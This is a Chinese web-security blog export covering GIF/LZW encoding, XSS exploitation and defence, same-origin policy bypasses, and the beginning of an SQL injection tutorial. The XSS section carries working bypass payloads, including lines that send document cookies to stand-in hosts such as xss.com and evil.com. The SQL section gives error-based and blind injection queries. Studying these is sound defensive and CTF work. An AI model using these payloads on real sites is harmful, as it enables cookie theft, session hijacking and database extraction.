size,这个值用来解码这个经过压缩的输出编码。之后为数据子块，子块第1个字节告诉后面图像数据有多少字节，范围为0-255,子块可以有多个，不断重复，直到一个子块告诉你后面内容为0字节，即表示图像结束。 尾部标志 Trailer固定值0x3B 表示文件结束 LZW 编码 与Huffman编码相比，LZW编码法被视作将不同长度字符串以固定长的码编辑（霍夫曼编码将固定长度字符用不同长度的码编辑）。其优点在于此方法只需存储一个相当小的表格，即可存储数据还原时相对应的值，所以所需成本相对地低；然而，这种算法的设计着重在实现的速度，由于它并没有对数据做任何分析，所以并不一定是最好的算法 LZW算法将每个第一次出现的串放在一个串表中，用一个数字来表示串，压缩文件只存贮数字，而不存贮串，从而使图像文件的压缩效率得到较大的提高。LZW算法首先建立一个字符串表，把每一个第一次出现的字符串放入串表中，并用一个数字来表示，这个数字与此字符串在串表中的位置有关，并将这个数字存入压缩文件中，如果这个字符串再次出现时，即可用表示它的数字来代替，并将这个数字存入文件中。如AB字符串，如果在压缩时用258表示，只要再次出现，均用258表示，并将AB字符串存入串表中，在图像解码时遇到数字258，即可从串表中查出258所代表的字符串AB。 假设我们要压缩ABCDAABBCCDABCD这一串，这四个字符可以用2bit来表示（0-A 1-B 2-C 3-D)。GIF规定的清除标志CLEAR的数值是原始数据字长表示的最大值加1,这时候就要用3位来表示了，即4-CLEAR,GIF还规定了一个结束标志END，它的值是清除标志CLEAR再加1,即5-END，之后的AB可能被记为6，BC记为7等等，这就是生成的串表，最后压缩的结果可能是0123236398145(不是这个字串的最终答案，只是一个格式参考)这样的形式 随着新的串(string)不断被发现，标号也会不断地增长，如果原数据过大，生成的标号集（string table)会越来越大，这时候操作这个集合就会产生效率问题。如何避免这个问题呢?Gif在采用lzw算法的做法是当标号集足够大的时候，就不能增大了，干脆从头开始再来，在这个位置要插入一个标号，就是清除标志CLEAR，表示从这里我重新开始构造字典，以前的所有标记作废，开始使用新的标记。这时候又有一个问题出现，足够大是多大？这个标号集的大小为比较合适呢？理论上是标号集大小越大，则压缩比率就越高，但开销也越高。 一般根据处理速度和内存空间连个因素来选定。GIF规范规定的是12位，超过12位的表达范围就推倒重来，并且GIF为了提高压缩率，采用的是变长的字长。比如说原始数据是8位，那么一开始，先加上一位再说，开始的字长就成了9位，然后开始加标号，当标号加到512时，也就是超过9为所能表达的最大数据时，也就意味着后面的标号要用10位字长才能表示了，那么从这里开始，后面的字长就是10位了。依此类推，到了2^12也就是4096时，在这里插一个清除标志，从后面开始，从9位再来。 这里给一个例子，看懂这个例子，基本就明白了。]]></content>
      <categories>
        <category>file format analysis</category>
      </categories>
      <tags>
        <tag>file format analysis</tag>
        <tag>image</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS利用与防御]]></title>
    <url>%2Fblog%2Fxss-bypass-tricks%2F</url>
    <content type="text"><![CDATA[XSS 知识利用XSS技术，攻击者可以在浏览器正在执行的原始服务器代码的上下文中插入远程代码。从浏览器角度来看，插入的代码看起来与合法应用一样，都源自同一个服务器，因此就会允许这些代码访问本地资源，最终将隐私数据泄露给攻击者，甚至会出现应用会话劫持现象。 xss 分类xss大致分为：反射型、存储型、DOM型（这三种为主流）. 无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。 反射型xss只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫非持久型xss 存储型xss会把用户输入的数据”存储”在服务器端，也叫持久性xss，常见留言板等可以提交展示用户输入内容的功能点。 DOM型xss可通过修改页面的DOM节点形成的xss漏洞 xss 危害xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。 以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）： cookie劫持（窃取cookie） 后台增删改文章等操作（类似于csrf骗取用户点击，利用js模拟浏览器发包，借助xmlhttprequest类） 钓鱼，利用xss构造出一个登录框，骗取用户账户密码。 Xss蠕虫（利用xss漏洞进行传播） 修改网页代码 利用网站重定向 获取用户信息（如浏览器信息，IP地址等） xss 利用XSS的绕过思路一般比较多，知识点比较细，这里我对我所遇到过的题目知识点及技巧做一个总结，不过建议还是先去看某个技巧相关的题目，那样理解更加深刻一些。本文并未对每个点做题目解析，而仅仅总结知识点，其余内容可以看各个CTF的XSS writeup。 XSS一般通常是对用户输入未做适当的处理，然后在渲染时，当把用户的输入放入网页中时，发生问题，这里最重要的是判断用户输入最终的输出位置及所处的上下文环境 了解输出所处环境这一点，我觉得是最重要的，知道了输出环境，才能去有效的构造payload而不是盲目的尝试。 位置 编码方式 事例 url中 url编码 %3c、%2f HTML标签或属性 HTML实体编码 &amp;#60;、&amp;lt; HTML事件、script标签 javascript编码 \u003c css中 16进制编码 \uHH 这里的编码方式指的是，当浏览器或者其他解析器去解析这个格式时，可以看成执行了一次对应的decode。 闭合当所处环境无法执行我们恶意代码时，通常会采用闭合的方式进行逃逸，闭合也是最为常见的绕过方式，因为一般闭合之后会给我们更大的自由度。 常见的闭合方式包括引号闭合、标签闭合、括号闭合等内容。闭合标签会优先识别 注释可以用--&gt;和--!&gt;闭合 JS代码块可以用--&gt;作为注释 换行有时候会使得字符所处环境可以很容易的改变，有时换行符不只有\n[\u000A]，\r[\u000D],\u2028[line separator],\u2029[paragraph separator]也被认为是有效的换行分隔符 有时没了让攻击立即渲染，有时需要加个空格或者换行 正则表达式绕过有时错误的正则表达式会给我们绕过造成机会。 多次替换，后者替换之后会将本来异常的内容构造成正常语句 ^$行首行尾的泄露 未进行多行匹配导致换行绕过 正则表达式特殊字符的利用$$、$&#39;等 构造 遇见toUpperCase等函数时，HTML标签大写后依旧可以使用，而js函数则不行，有一些语言由于没有对应的大写字母，toUpperCase会使得其转换为英文某个字母 程序中使用的某些变量或者JSON字段，可以通过用户输入构造同名的变量，从而覆盖默认值，造成绕过检测。 使用/* */通常可以在多行内容时形成DOM-XSS 关键词被过滤，可以使用eval(String.fromCharCode(97,108,101,114,116,40,49,41)) 字符串可以通过parseInt(str,radix)转为数字，使用(number).toString(radix)在payload中转回来 一些技巧 JSFUCK 使用[]()+!这六个字符完成任意内容，不过payload会很长 input标签内可以通过type来修改类型，例如type=img/type=hidden 在js环境中，&#39;String&#39;(alert(1)) 字符串跟着括号内的语句，会执行 javascript 伪协议文章源自这里 思路是利用数据URI机制，类似data:这种，在URL请求中构造javascript伪协议，比如chrome中直接输入以下内容即可触发: 1javascript:alert(1) 当然，如果有WAF还可以利用其替换、解码规则 1http(s)://host/page?p=&lt;iframe src=?p=%253Csvg/o%256Eload%253Dalert(1)%253E&gt; 构造恶意图片思路是构造恶意jpeg文件，然后以js去加载此图片，文章在这里 其核心有几点，首先是构造2F 2A字段，用于形成注释/*左部，具体jpeg每个字段的含义在我博客这篇文章有总结： 1FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00.... 然后在comment字段中，闭合*/=alert(&quot;Burp rocks.&quot;)/* 1FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A 最后再闭合前一个注释 1232A 2F 2F 2F FF D9= *///FF D9 成功注释前面和后面 如果可以&lt;script src=&quot;evil.com/evil.jpeg&quot;&gt;&lt;/script&gt;便会成功触发xss 利用CRLF其实有点属于HTTP头部注入的内容了，原文在这里 其背景如下： 某一个接口URL： 1https://xxx.com/cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a 发现返回内容如下： 12345678HTTP/1.1 200 OKServer: nginx/1.6.0Date: Sat, 30 Jan 2016 12:08:28 GMTContent-Type: text/html; charset=gbkContent-Length: 0Connection: keep-aliveCache-Control: no-cache, must-revalidateSet-Cookie: pass_ticket=a; Domain=xxx.com; Path=/; Expires=Sun, 31-Jan-2016 12:08:28 GMT 可以看到返回中有pass_ticket且内容不变，尝试CRLF注入，虽然注入成功，但存在WAF过滤了某些内容，其绕过思路是这样的： 1231. 插入Content-Type更改response中的charset2. 选择一个字符集，保证该字符集中的某个字符或字符串会被浏览器忽略（也可以是unicode transform）3. 将会被忽略的字符插入到被blacklist拦截的字符之间 最终构造的payload为: 1?exportkey=&amp;pass_ticket=a%0D%0AContent-Length:120%0D%0AX-XSS-Protection:0%0D%0AContent-Type:text/html;%20charset=ISO-2022-JP%0D%0A%0D%0A%3Cimg%20src=x%20on%1B%28Jerror=%22al%1B%28Jert%28document.co%1B%28Jokie%29%22%3E HTML 闭合优先级看以下代码: 12&lt;noframes&gt;&lt;img src=&quot;//a.com/p.jpg&lt;/noframes&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&gt; 按理来说，由于都被双引号包裹，应该出现一个错误图片，但运行一下才发现，会执行弹窗，原因是浏览器将字符串中&quot;xx&lt;/noframes&gt;xx&quot;解释为了标签，把前面的&lt;noframe&gt;闭合了，导致后面的脚本成功运行。可以发现，浏览器在做DOM解析的时候，有些标签的优先级是高于&quot;的，有人fuzz了一下： 123456789&lt;!--&lt;iframe&gt;&lt;noframes&gt;&lt;noscript&gt;&lt;script&gt;&lt;style&gt;&lt;textarea&gt;&lt;title&gt;&lt;xmp&gt; 这些标签都比&quot;闭合的优先级高。有时候，这些特性，会很有用。 CSP bypassxss结合上传漏洞最普通最常见的CSP规则，只允许加载当前域的js。 站内总会有上传图片的地方，如果我们上传一个内容为js的图片，图片就在网站的当前域下了。 1alert(1)// 直接加载图片就可以了 1&lt;script src='upload/test.js'&gt;&lt;/script&gt; 重定向当你发现设置self并不安全的时候，可能会选择把静态文件的可信域限制到目录，看上去好像没什么问题了。 但是如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 12假设static目录下存在一个302文件&lt;?php Header("location: ".$_GET['url'])?&gt; 上传一个test.jpg,然后通过302.php跳转到upload目录加载js就可以成功执行 1&lt;script src="static/302.php?url=upload/test.jpg"&gt; 利用浏览器漏洞来源于这篇文章 Talos-2017-0306（CVE-2017-2419, CVE-2017-5033） 我们发现Microsoft Edge浏览器（40.15063版仍未修复）、Google Chrome浏览器（已修复）以及Safari浏览器（已修复）中存在一个信息泄露漏洞。利用这个漏洞，攻击者可能绕过Content-Security-Policy头指定的策略，导致信息泄露问题。 漏洞利用由三个主要模块构成：（a）在Content-Security-Policy中使用unsafe-inline指令，使浏览器支持内联inline脚本代码；（b）使用window.open()打开一个空白的新窗口；（3）调用document.write函数将代码写入新创建的空白窗口对象中，以绕过文档上的CSP限制策略。 这个问题会影响Microsoft Edge浏览器、老版本的Google Chrome浏览器以及Firefox浏览器，原因在于about:blank页面与加载该页面的文档属于同一个源，但不受CSP策略限制，基于这些事实，攻击者就可以完成漏洞利用。 攻击者可以使用window.open(&quot;&quot;,&quot;_blank&quot;)创建一个新页面，然后使用document.write将恶意脚本写入该页面，由于攻击者处于about:blank页面中，因此可以绕过原始页面上的CSP限制策略，成功访问其他站点。有人可能会说，这是因为CSP头中使用了不安全内联方式来加载代码才导致这个问题，但即便如此，浏览器也应该阻止任何形式的跨站通信行为（比如使用1×1像素大小的跟踪图片等行为）。 about:blank页面与其加载文档属于同一个源，但却不受CSP限制策略影响。在CSP规范文档中，早已明确指出CSP限制策略应该被页面所继承。注意一下，about:blank标签和本地文件路径的CSP规则 xss防御 可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie） xss filter（检查输入，设置白名单方式） 输出检查（编码，转义，常用编码：html编码，js编码，16进制等) 针对不同位置的输出，使用不同的处理方式 处理富文本 header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略） httponly规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。但由于现代网页功能越来越丰富，js通常都需要访问cookie中的内容，所以在很多网站选择了不使用httponly字段。 xss filterxss filter往往是一个文本文件，里面包含了允许被用户输入提交的字符（也有些是包含不允许用户提交的字符）。它检测的点在于用户输入的时候，xss filter分为白名单与黑名单，推荐使用白名单，但即使使用白名单还是无法完全杜绝xss问题，并且使用不当可能会带来很高的误报率。 编码转义编码方式有很多，比如html编码、url编码、16进制编码、javascript编码等。在处理用户输入时，除了用xss filter的方式过滤一些敏感字符外，还需要配合编码，将一些敏感字符通过编码的方式改变原来的样子，从而不能被浏览器当成js代码执行。 处理富文本有些网页编辑器允许用户提交一些自定义的html代码，称之为富文本。想要在富文本处防御xss漏洞，最简单有效的方式就是控制用户能使用的标签，限制为只能使用a、div等安全的标签。 CSP Content Security Policy 内容安全策略CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。 CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的Content-Security-Policy的字段。另一种是通过网页的&lt;meta&gt;标签。 例如： 1234567891011 &lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"&gt; 上面代码中，CSP 做了如下配置。脚本：只信任当前域名&lt;object&gt;标签：不信任任何URL，即不加载任何资源样式表：只信任cdn.example.org和third-party.org框架（frame）：必须使用HTTPS协议加载其他资源：没有限制启用后，不符合 CSP 的外部资源就会被阻止加载。 除了上述的&lt;meta&gt;之外，更为常见的是服务器返回Content-Security-Policy字段,一个CSP头由多组CSP策略组成，中间由分号分隔,其中每一组策略包含一个策略指令和一个内容源列表: 1Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline' default-src指令定义了那些没有被更精确指令指定的安全策略,即如果后面没有指定，就是用default-src策略: child-src 定义了web workers以及嵌套的浏览上下文（如&lt;frame&gt;和&lt;iframe&gt;）的源 connect-src 定义了请求、XMLHttpRequest、WebSocket和EventSource的连接来源 font-src 字体加载的有效来源 img-src 定义了页面中图片和图标的有效来源 media-src 定义了页面中媒体流有效来源 object-src script-src 页面中Javascript的有效来源 style-src 页面中CSS样式的有效来源 1234关键字：'none': 代表空集；即不匹配任何 URL。'self': 代表和文档同源，包括相同的 URL 协议和端口号'unsafe-inline': 允许使用内联资源 # CSP常见绕过 url跳转 123456789default-src: 'none'情况下:&lt;meta http-equiv="refresh" content="1;url=http://www.xss.com/x.php?c=[cookie]" &gt;允许unsafe-inline情况下,使用window.location或window.open:&lt;script&gt; window.location="http://www.xss.com/x.php?c=[cookie]";&lt;/script&gt; &lt;link&gt;标签预加载 CSP对link标签的预加载功能考虑不完善 在chrome下,可以使用link预加载绕过: 1&lt;link rel="prefetch" href="http://evil.com/x.php?c=[cookie]"&gt; 或者在Firfox中使用link dns预解析: 1&lt;link rel="dns-prefetch" href="//[cookie].xxx.ceye.io"&gt; 要在任何可能地方测试文章来源于这里，给我们提供了一些新的思路 DNS解析时没有过滤 12345678910我使用的子域名是hack.bo0om.ru（任何子域名都可以），并且将我的IP设置成了该域名的NS服务器。接下来修改dnschef.ini并完成dnschef的配置，添加下列记录：[MX]*.xss.hack.bo0om.ru="--&gt;'&gt;&lt;script/src=//bo0om.ru/xss.js&gt;[NS]*.xss.hack.bo0om.ru="--&gt;'&gt;&lt;script/src=//bo0om.ru/xss.js&gt;[CNAME]*.xss.hack.bo0om.ru="--&gt;'&gt;&lt;script/src=//bo0om.ru/xss.js&gt;如果某个在线服务得到了DNS数据之后还将它们打印在了屏幕上，只能说明该服务忘记过滤掉这些数据了。 XSS Payload添加到了我Instagram的个人状态 1"--&gt;'&gt;&lt;script/src=//evil.com/xss.js&gt;&lt;/script&gt; 如果有些服务器读取了这些信息而没有过滤，则会触发xss。 google play中的 xssLinux系统支持在文件名中使用特殊字符。 虽然我们可以在文件名中注入自己的脚本代码，但坏消息是这里有30个字符的限制。不幸的是，我手上可以使用的域名都有点长，而且那些只有一个或两个字符的域名估计都已经被注册掉了。但是在现代Web中，你可以使用punycode编码来注册域名，而且现在还有很多免费的punycode域名没有被注册。比如说xn–g3h。所以我注册了一个.ws域名（请参考下图，有个符号这里打不出来，包括点号在内一共四个字符）。]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>web security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2Fblog%2Fsame-origin-policy%2F</url>
    <content type="text"><![CDATA[同源策略同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。同源三要素：主机、协议、端口 同源策略作用浏览器的同源策略会导致跨域，这里同源策略又分为以下两种： DOM同源策略：禁止对不同源页面DOM进行操作。这里主要场景是iframe跨域的情况，不同域名的iframe是限制互相访问的。 XmlHttpRequest同源策略：禁止使用XHR对象向不同源的服务器地址发起HTTP请求。 同源策略没有禁止脚本的执行，而是禁止读取HTTP回复。 我们会发现，SOP其实在防止CSRF上作用非常有限，CSRF的请求往往在发送出去的那一瞬间就已经达到了攻击的目的，比如发送了一段敏感数据，或请求了一个具体的功能，是否能读取回复并不那么重要（唯一的作用是可以防止CSRF请求读取异源的授权Token）。 另外，一般静态资源通常不受同源策略限制，如js/css/jpg/png等。 要注意，这里的CSRF攻击指的是通过链接或者脚本去访问恶意网站的情况，而不是通过ajax访问的情况，ajax的同源策略正是为了防止CSRF攻击。 跨源访问同源策略控制了不同源之间的交互，例如在使用XMLHttpRequest 或 &lt;img&gt; 标签时则会受到同源策略的约束。交互通常分为三类： 跨域写（Cross-origin writes）:通常被允许，例如链接，重定向和表单提交，一些不常见的HTTP请求方法例如PUT,DELETE等需要先发送预请求（preflight），例如发送OPTIONS来查询可用的方法。 跨域嵌入（Cross-origin embedding）:通常被允许 跨域读:通常被禁止，然而，我们可以用其他方法达到读取的效果。 以下是一些跨域请求的例子： &lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。 &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type消息头。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 &lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,… &lt;video&gt; 和 &lt;audio&gt;嵌入多媒体资源。 &lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。 @font-face引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。 &lt;frame&gt; 和 &lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 一个经久不衰的BUG早在2011年，一个用户在Mozilla的Bug追踪系统中就提交了一个issue，声称他可以判定某个网站的访客是否登录了gmail,facebook等等。 嵌入iframe来获取一个访问网站的用户是否登陆了gmail: 12345&lt;img style="display:none;" onload="logged_in_to_gmail()" onerror="not_logged_in_to_gmail()" src="https://mail.google.com/mail/photos/img/photos/public/AIbEiAIAAABDCKa_hYq24u2WUyILdmNhcmRfcGhvdG8qKDI1ODFkOGViM2I5ZjUwZmZlYjE3MzQ2YmQyMjAzMjFlZTU3NjEzOTYwAZwSCm_MMUDjh599IgoA2muEmEZD"/&gt; src的代码试图访问一张gmail中攻击者上传的图片，如果用户没有登陆gmail，就无法成功加载。从而达到判断用户是否登陆gmail的效果。这种方法可以推广到任何对不应跨源访问的资源没有正确设置同源策略的网站。 跨域的解决方案document.domain跨子域常见于不同子域共享数据 如果两个window或者frames包含的脚本可以把domain设置成一样的值，那么就可以规避同源策略，每个window之间可以互相沟通。例如，orders.example.com下页面的脚本和catalog.example.com下页面的脚本可以设置他们的document.domain属性为example.com，从而让这两个站点下面的文档看起来像在同源下，然后就可以让每个文档读取另一个文档的属性。 这种方式也不是一直都有用，因为端口号是在内部保存的，有可能被保存成null。换句话说，example.com的端口号80，在我们更新document.domain属性的时候可能会变成null。为null的端口可能不被认为是80，这主要依赖浏览器实现。 # CORS 跨域资源共享CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing） 这种方式使用了一个新的Origin请求头和一个新的Access-Control-Allow-Origin响应头扩展了HTTP。允许服务端设置Access-Control-Allow-Origin头标识哪些站点可以请求文件，或者设置Access-Control-Allow-Origin头为*，允许任意站点访问文件。浏览器，例如Firefox3.5，Safari4，IE10使用这个头允许跨域HTTP请求。 # jsonp详见JSONP利用与防御文章 # 服务器代理代理是万能的，什么都不影响了 # 使用postMessage实现页面之间通信信息传递除了客户端与服务器之前的传递，还存在以下几个问题： 页面和新开的窗口的数据交互。 多窗口之间的数据交互。 页面与所嵌套的iframe之间的信息传递。 window.postMessage是一个HTML5的api，允许两个窗口之间进行跨域发送消息。这个应该就是以后解决dom跨域通用方法了，具体可以参照MDN。 #WebSocket现代浏览器允许脚本直连一个WebSocket地址而不管同源策略。然而，使用WebSocket URI的时候，在请求中插入Origin头就可以标识脚本请求的源。为了确保跨站安全，WebSocket服务器必须根据允许接受请求的白名单中的源列表比较头数据。 对同源策略的利用URI解析IP是URI的重要组成部分，如果留心了RFC的人就会知道，IP不止有一种格式。下面的标注形式其实都代表了同一个IP：216.58.209.68。 1234216.58.535720xD8.072.5357236277333160330.3854660 当然，不同浏览器对URI的解析方式是不一样的，可能并不能正确跳转的google的页面，但当浏览器URI解析存在漏洞时，就会有作用。 12345当某些浏览器对URI的解释存在漏洞的时候，就可以构造出有趣的攻击链来绕过SOP。 比如CVE-2015-7188火狐浏览器SOP绕过中。攻击者构造了特殊的URL，并在攻击者自己控制的来自37.187.18.85的网页中发起跨域请求http://37.187.18.85BuFF20translate.google.com/fx_sop_bypass/FlashTest.swf?url=http://translate.google.com/manager/website/ 先通过B让Firefox认为这个请求是请求37.187.18.85本身的内容，再通过类似@字符的Unicode字符＠(uFF20)让浏览器认为@之前的字符都是translate.google.com的账号和密码，从而返回translate.google.com的网页内容，实现绕过SOP。 设计缺陷导致SOP绕过在Java6，7中，如果两个域名解析到相同的IP，则会认为他们同源。假设我们有attacker.com和victim.com,两者都共享主机123.123.123.123。攻击者attacker.com可以在自己控制的域名下上传一个jar文件来访问victim.com的内容。 访问本地文件的同源策略不同的浏览器使用不同的浏览器引擎，而不同的引擎对于同源策略的处理也并非完全一致。 1234567&lt;!-- 文件路径：/home/user/1.html --&gt; &lt;html&gt; &lt;frameset cols="50%,*"&gt; &lt;frame src="/home/user/dir/2.html"&gt; &lt;frame src="..."&gt;&lt;/frameset&gt; &lt;/html&gt; 文件1与2在不同的浏览器引擎中可能认为是同源/非同源 IE的特别之处 TrustZones（信任域）：当一个URI被加入到了IE的信任网站区域中时，浏览器会无视同源策略。 IE在考虑同源策略时不包括端口， 这意味着不同端口上的应用程序可以读取到比如用户的登陆账户密码/cookie等。 通过变更自身的源绕过同源策略:IE 6，7版中网页可以通过document.domain设置自身的来源为任意其他来源。如今网页仍然可以更改源，但是有一些限制。 网页可以变更自身的源为父级域名。 例如http://malicious.eth.space/1.html可以通过执行 1document.domain = "eth.space"; 来绕过同源策略的限制，从而可以读取http://eth.space/login.html上的内容。这其中的应用大家可以自己去想。 防御CORS cross-origin sharing stander 跨源资源共享机制使用windows.postMessage使用JSONP CSP 内容安全策略禁止（你的资源被）跨源访问为了禁止跨域写，我们需要引入CSRF令牌，然而我们需要正确的配置同源策略，否则CSRF令牌本身也将被恶意网页读取。 为了禁止跨域读，我们可以通过设置X-Frame-Options头来禁止该页面被嵌入到恶意页面中，就如同在“经久不衰的BUG”中一样。 为了禁止跨域嵌入，确保你的资源本身无法嵌入到各种跨域访问方式中，比如&lt;script data-original=&gt;&lt;/script&gt; &lt;img data-original=x&gt;&lt;/img&gt;，&lt;svg onload=&gt;，各种字体加载等等。同时，使用CSRF令牌也可以有效避免被跨域嵌入。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>same origin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL Injection 利用与防御]]></title>
    <url>%2Fblog%2Fsql-injection%2F</url>
    <content type="text"><![CDATA[SQL知识注释方式SQL中使用#、--␠(␠代表空格的意思)、/* */作为注释，前两者表示此符号之后的本行无效，后者是直到匹配为止。注意有些浏览器在url输入#是需要改成%23不然按回车不会访问。 连接符MySQL使用+作为连接符，例如:1SELECT count(*) FROM test WHERE name='te'+'st' 内置数据库、表数据库中一般会内置一些databases和tables用于存放整个数据库的信息，而这些数据库或表的名称与功能是确定的，很容易帮助我们获取到信息。以MySQL为例，安装完成之后就会有一下几个数据库： information_schema mysql performance_schema sys 与注入相关的是information_schema库中的SCHEMATA、TABLES、COLUMNS,他会显示所有数据库的表名、列名以及所属数据库，在拖库是非常有用。例如下面语句就是获取当前数据库中所有表名： 1SELECT group_concat(table_name) from information_schema.tables where table_schema=database() 常用函数在SQL注入中经常需要使用一些内置函数，可以帮我们有效的获取信息或者帮助我们测试。 函数 作用 database() 获取当前数据库名 version() 获取当前数据库版本(同@@version) user() 获取当前用户名(同current_user) @@datadir 数据库存储位置 load_file(path) 读取文件数据 into outfile 写入文件 concat(a,b,c,...) 连接字符串abc… concat_ws(separator,a,b,...) 第一个为分隔符，后面的为连接字符串 group_concat() 用于合并多条记录中的结果 substr(string,start,length) 求string的子串(同substring) ascii() 返回字符ascii值，常用于盲注 length() 求长度 if(exp1,exp2,exp3) 如果exp满足则返回exp2否则返回exp3 now() 返回当前时间 hex() 返回字符串16进制数值，很有用 unhex() 反向 @@basedir MySQL安装目录 @@version_compile_os 操作系统 SQL注入基本方法 寻找注入点(各种闭合、宽字符注入、报错注入、盲注) 得到字段总数 通过order by num (通过不停增加num值直到出错) 得到显示位 通过更改select 1,2,3 等确定显示的内容在第几个字段 根据显示位，修改查询数据库版本 当前数据库名等信息。 查选库，通过information_schema 的 schemata 返回所有数据库名 通过information_tables查看此数据库所有表名 查看列名 information_columns 得到具体内容 以上是SQL注入的基本思路，围绕每一步都可能有各种方式，之后总结了一些常见的注入技巧。 闭合注入1http://test.com?id=1' or 1=1 # 最经典的闭合方式，便于我们理解SQL注入原理。 宽字符注入宽字符注入引起的原因主要是编码问题，服务器端采用了GBK编码，GBK编码将2个字节看成一个汉字，而服务器又对&#39;做了转义编程\&#39;，最终使得&#39;逃逸造成的结果。 具体来看： 123SELECT * from test where number = '1'SELECT * from test where number = '1\'' 想使用&#39;闭合字符型，但因后台做过转义处理，使得&#39;被\转义了，这样一般思路是: 在\前面想办法加一个\变成\\&#39; 去掉\,使得\是前一个字符的内容 宽字符注入采用的是第2种思路，当输入是:1http://test.com?number=%df' 因为后台做了转义，所以真正的输入会变成%df\&#39;,\的hex编码值为0x5c,所以就变成了%df%5c&#39;,而因为采用的是GBK编码，两个字节认为是一个字符，所以就被解释成運&#39;,这样&#39;就逃逸出来了。 使用%df&#39;、%bf&#39;、%d5&#39;均可 报错注入利用主键重复12mysql&gt; select count(*),concat(floor(rand(0)*2), 0x3a3a3a, version(), 0x3a3a3a) x from information_schema.schemata group by x;ERROR 1062 (23000): Duplicate entry '1:::5.7.18:::' for key '&lt;group_key&gt;' 这是经典的利用主键重复构成的报错，count(*)、rand()、group by 缺一不可。其主要原因是:rand(0)序列为稳定序列,即运行多少次都是同一个结果,而当执行floor(rand(0)*2)时，得到的结果值会不停地后移，在使用select count(*) group by x时，会统计x的个数，而x是一个动态的值，最终在计算时和插入时得到的结果不一致，与表中已有键冲突，造成的报错 1234567891011121314151617181920212223+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 || 0.620881741513388 || 0.6387474552157777 || 0.33109208227236947 || 0.7392180764481594 || 0.7028141661573334 || 0.2964166321758336 |+---------------------++------------------+| floor(rand(0)*2) |+------------------+| 0 || 1 || 1 || 0 || 1 || 1 || 0 |+------------------+ 我们来详细看一下步骤，这里把floor(rand(0)*2)记做了x，查询语句为: 1SELECT count(*),x from information_schema.schemata group by x 建立空表,字段为x(即key)和count 取x(0，第一次计算)，然后查表，表中没有，会再次计算x(1,第二次计算)，放入表中，并将count值+1，即表中现在是(1,1) 再取x(1，第三次计算)，表中有，不需要计算，count值+1，表中现在是(1,2) 再取x(0,第四次计算),表中没有，需要计算x(1,第五次计算)，放入表中，发现已经存在x为1的记录，报错Duplicate entry 利用xpath errorMySQL提供了两个XML解析函数，ExtractValue()和UpdateXML(),具体可以看这里,其第二个参数均需要符合xpath语法的字符串，否则会报错，这里就可以利用。 12345mysql&gt; select extractvalue(0x123,concat(0x3a3a,@@version,0x3a3a));ERROR 1105 (HY000): XPATH syntax error: '::5.7.18::'mysql&gt; select updatexml(1,concat(0x3a3a,@@version,0x3a3a),1);ERROR 1105 (HY000): XPATH syntax error: '::5.7.18::' 盲注Time-based1231' AND select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null) # 1' AND select if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(10),null) # 利用sql语句执行成功后延时来得到结果。 这里,sleep()函数有一个特性: 1234567891011121314151617181920212223mysql&gt; select * from books;+---------+-------+-----------+--------+| book_id | title | author_id | genre |+---------+-------+-----------+--------+| 1 | happy | 1 | novel || 2 | sad | 2 | poetry || 3 | hi | 12 | drama |+---------+-------+-----------+--------+3 rows in set 